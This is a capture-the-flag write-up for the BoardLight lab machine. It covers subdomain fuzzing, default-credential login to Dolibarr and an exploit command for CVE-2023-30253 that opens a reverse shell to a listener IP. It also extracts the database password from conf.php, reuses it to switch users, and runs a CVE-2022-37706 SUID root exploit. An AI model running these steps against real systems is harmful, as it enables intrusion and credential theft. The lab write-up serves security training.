# BoardLight

**Difficulty:** Easy | **OS:** Linux | **IP:** `10.129.231.37`

## Summary
**Boardlight** is an easy-difficulty Linux machine featuring a web application hosting a Dolibarr CRM instance on a discovered subdomain. Initial access is achieved by identifying the `crm.board.htb` vhost, logging into Dolibarr 17.0.0 using default credentials (`admin:admin`), and exploiting an Authenticated Remote Code Execution vulnerability (**CVE-2023-30253**). Privilege escalation involves pivoting to the system user `larissa` using hardcoded database credentials found in Dolibarr's configuration file (`conf.php`), followed by exploiting a SUID privilege escalation vulnerability in the Enlightenment window manager binary (`enlightenment`).

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating open TCP ports and service versions:

- **22**: SSH (OpenSSH server)
- **80**: HTTP (Apache httpd web server)

### Web Enumeration & Subdomain Discovery
We perform directory brute-forcing on the main domain:

- _/index.php_ — Main landing page.
- _/about.php_ — About section.
- _/contact.php_ — Contact form.
- _/do.php_ — Endpoint handling form actions.

Next, we fuzz virtual hosts/subdomains using `wfuzz`:

```wfuzz -c -hl=517 -t 100 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.board.htb" http://10.129.231.37```

**Key Finding:** Subdomain `crm.board.htb` is discovered, hosting a **Dolibarr CRM** login panel. We add the host entry to our local resolution:

```echo "10.129.231.37 board.htb crm.board.htb" >> /etc/hosts```

## Exploitation (User Flag)
### Dolibarr RCE Exploitation (CVE-2023-30253)

- Accessing [http://crm.board.htb](http://crm.board.htb), we attempt authentication using default credentials: `admin : admin`.
- Login is successful into Dolibarr version **17.0.0**.
- We identify **CVE-2023-30253**, an authenticated PHP code injection vulnerability present in websites/pages management within Dolibarr 17.0.0.

Using a public exploit script, we pass our listener IP and port:

```python3 exploit.py http://crm.board.htb admin admin 10.10.15.97 443```

With a Netcat listener active on port 443, we receive a reverse shell connection running under the web server context (`www-data`).

### Lateral Movement (`www-data` to `larissa`)
Enumerating the Dolibarr web root directory for sensitive configuration files:

```find /var/www/html -name "*conf*" 2>/dev/null```

We locate the main configuration file at `/var/www/html/crm/htdocs/conf/conf.php` and extract database credentials:

```
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

We test credential reuse against local users listed in `/etc/passwd`. Attempting to log in as `larissa` via SSH or `su` using `serverfun2$2023!!` successfully authenticates us:

```
su larissa
# Password: serverfun2$2023!!
```

We retrieve the `user.txt` flag from `/home/larissa/user.txt`.

## Privilege Escalation (Root Flag)

### SUID Binary Enumeration

Checking system group memberships reveals `larissa` belongs to `adm`. We then search for unusual binaries with SUID permissions set:

```find / -perm -4000 2>/dev/null```

**Key Finding:** Discovered `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys`, a SUID helper binary associated with the Enlightenment window manager desktop environment.

### Exploiting Enlightenment (CVE-2022-37706)
Enlightenment SUID binaries contain a known privilege escalation flaw (CVE-2022-37706) where input parameters are unsafely passed to system calls without proper sanitization.

- We download/create the exploit payload targeting `enlightenment_sys`.
- Executing the exploit script triggers arbitrary command execution as `root`.

```
./exploit.sh
id
# uid=0(root) gid=0(root) groups=0(root)
```

We obtain full `root` privileges and capture `root.txt`.

## Conclusions & Key Lessons
- **Default Credentials:** Administrative panels (such as Dolibarr CRM) must never retain factory default login credentials (admin:admin).
- **Unpatched Web Applications:** Running outdated software versions (Dolibarr 17.0.0) leaves internal infrastructure vulnerable to publicly documented RCE exploits.
- **Password Reuse:** Reusing database passwords (conf.php) for interactive operating system accounts (larissa) allows attackers to pivot internally.
- **SUID Privilege Boundaries:** Binaries running with SUID permissions (such as Enlightenment desktop helpers) must enforce strict input sanitization to prevent arbitrary command execution.
